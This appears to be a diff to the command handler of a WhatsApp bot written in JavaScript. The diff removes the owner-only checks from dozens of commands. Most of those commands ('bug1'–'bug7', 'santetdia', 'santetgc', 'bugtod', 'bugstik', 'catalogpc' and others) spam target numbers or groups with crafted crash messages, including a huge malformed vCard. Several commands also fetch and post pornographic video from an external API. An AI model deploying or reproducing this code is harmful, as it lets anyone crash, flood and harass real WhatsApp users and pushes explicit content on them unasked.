@@ -449,7 +449,6 @@ haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }
 }
 break
 case 'poll': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
@@ -480,7 +479,6 @@ deploy('sukses sendbug')
 break
 //=================================================//
 case 'troli2': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
@@ -499,7 +497,6 @@ haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
 }
 break
 case 'santetdia': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return anjay(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
 num = q.split('|')[0]
@@ -521,7 +518,6 @@ anjay(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
 break
 case 'santetgc': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return anjay(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
 num = q.split('|')[0]
@@ -543,21 +539,18 @@ anjay(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
 break
 case 'ducu': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 yy = fs.readFileSync('./baseikal/sound/hwmods.HW')
 haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`Haikal APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
 }
 break
 case 'daca': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
  ilih = fs.readFileSync('./baseikal/sound/hwmods.HW')
  haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`Haikal APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
  }
  break
 case 'docu': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
 "documentMessage": {
@@ -577,7 +570,6 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 case 'duc': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "documentMessage": {
@@ -597,7 +589,6 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 case 'darkness': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "documentMessage": {
@@ -617,7 +608,6 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 case 'bug1': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "audioMessage": {
@@ -638,7 +628,6 @@ haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
 break
 //=================================================//
 case 'bug2': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -662,7 +651,6 @@ haikal.relayMessage(m.chat, image.message, { messageId: image.key.id })
 break
 //=================================================//
 case 'bug3': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -684,7 +672,6 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 break
 //=================================================//
 case 'bug4': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "extendedTextMessage": {
@@ -700,7 +687,6 @@ haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
 break
 //=================================================//
 case 'bug5': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "stickerMessage": {
@@ -722,7 +708,6 @@ haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
 break
 //=================================================//
 case 'bug6': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -740,7 +725,6 @@ haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
 break
 //=================================================//
 case 'bug7': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "contactMessage": {
@@ -753,7 +737,6 @@ haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
 break
 //=================================================//
 case 'lokas': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -769,7 +752,6 @@ haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.
 }
 break
 case 'buglokas': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -785,7 +767,6 @@ haikal.relayMessage(m.chat, location.message, { messageId: location.key.id })
 break
 //=================================================//
 case 'buginvite': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -803,7 +784,6 @@ haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id
 break
 //=================================================//
 case 'troli': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -827,7 +807,6 @@ haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
 break
 //=================================================//
 case 'catalog': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -856,7 +835,6 @@ break
 
 //=================================================//
 case 'catalogpc': case 'cataloggc':  {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return anjay(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
 num = q.split('|')[0]
@@ -888,7 +866,6 @@ break
 //=================================================//
 /*BUG WACAP */
 case 'ampas1' : {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
@@ -914,7 +891,6 @@ break
 /*BUG WACAP */
 case 'ampas2' : {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
 a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
 haikal.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
@@ -938,7 +914,6 @@ break
 //=================================================//
 case 'gaskal': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
@@ -947,7 +922,6 @@ deploy(`${m.pushName} Hello Saya Bot ZALL MAKER${text ? ': ' + text : ''}`)
 break
 //=================================================//
 case 'bugstik':{
-if (!isCreator) throw sticOwner(from)
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -981,7 +955,6 @@ deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 //=================================================//
 case 'bugie':{
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1011,7 +984,6 @@ deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 //=================================================//
 case 'Darkness2':{
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1067,21 +1039,18 @@ haikal.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a =>
 break
 case 'hiya':{
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
 anuin = fs.readFileSync('./baseikal/sound/ngeselin.BIN')
 haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `ZALL MAKER ${ngazap(prefix)}.BIN`, title: `ZALL MAKER ${ngazap(prefix)}.BIN` }, { quoted: doc })
 }
 break
 //=================================================//
 case 'bugtod': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
  const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ZALL MAKER${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:ZALL MAKER\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
 haikal.sendContact(m.chat, global.ownerr, fkontaak)
 }
 break
 case 'bugbokep':{
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
 haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: doc })
@@ -1153,7 +1122,6 @@ break
 //=================================================//
 case 'jadibug1': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
 if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
 let media = await quoted.download()
@@ -1165,7 +1133,6 @@ break
 //=================================================//
 case 'jadibug2': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
 if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
 if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
@@ -1177,7 +1144,6 @@ haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `
 break
 //=================================================//
 case 'jadibug3': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
 if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
@@ -1191,7 +1157,6 @@ break
 //=================================================//
 case 'jadibug4': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
 if (!quoted) throw 'Reply Image'
 if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
 let media = await haikal.downloadAndSaveMediaMessage(quoted)
@@ -1207,7 +1172,6 @@ fs.unlinkSync(ran)
 break
 //=================================================//
 case 'jadibug5': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!quoted) throw 'Reply Image'
 if (/image/.test(mime)) {
@@ -1222,42 +1186,36 @@ break
 //=================================================//
 //=================================================//
 case 'hu': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
  mem = fs.readFileSync('./baseikal/sound/tes.mp3')
  haikal.sendMessage(m.chat, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  break
 case 'hi': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
  mom = fs.readFileSync('./baseikal/sound/ketawa.mp3')
  haikal.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  break
 case 'ha': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
  mim = fs.readFileSync('./baseikal/sound/ketawa.mp3')
  haikal.sendMessage(m.chat, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  break
 case 'he': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
  mum = fs.readFileSync('./baseikal/sound/awkwk.mp3')
  haikal.sendMessage(m.chat, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  break
 case 'ba': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
  ah = fs.readFileSync('./baseikal/sound/bang.mp3')
  haikal.sendMessage(m.chat, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  break
 case 'be': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
  eh = fs.readFileSync('./baseikal/sound/nob.mp3')
  haikal.sendMessage(m.chat, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1265,7 +1223,6 @@ if (isBan) throw sticBanLu(from)
  break
 case 'bu': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
 
  ih = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
  haikal.sendMessage(m.chat, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1273,35 +1230,30 @@ if (!isCreator) return
  break
 case 'bi': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
 
  nyong = fs.readFileSync('./baseikal/sound/mastah.mp3')
  haikal.sendMessage(m.chat, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  break
 case 'ca': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
  ri = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
  haikal.sendMessage(m.chat, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  break
 case 'ci': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
  ru = fs.readFileSync('./baseikal/sound/loli.mp3')
  haikal.sendMessage(m.chat, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  break
 case 'cu': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
  re = fs.readFileSync('./baseikal/sound/kesel.mp3')
  haikal.sendMessage(m.chat, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
  }
  break
 case 'co': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
  ro = fs.readFileSync('./baseikal/sound/ngeselin.mp3')
  haikal.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1486,7 +1438,8 @@ case 'ngtd':
 case 'ngentod': 
 case 'ngentot':
 case 'ngtot':  
-case 'ngen':  {
+case 'ngen':
+case 'yatim':  {
 if (isBan) throw sticBanLu(from)
  anjay("Jangan Toxic Cok")
  hiy = fs.readFileSync('./baseikal/sound/ketawa.mp3')
@@ -3942,7 +3895,6 @@ anjay(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* 
 break
 //=================================================//
 case 'bokep':{
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
 haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted:hw })
@@ -4135,7 +4087,6 @@ haikal.sendMessage(m.chat, anu, {quoted: hw})
 break
 //=================================================//
 case 'bot': {
-if (!isCreator) return
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productMessage": {
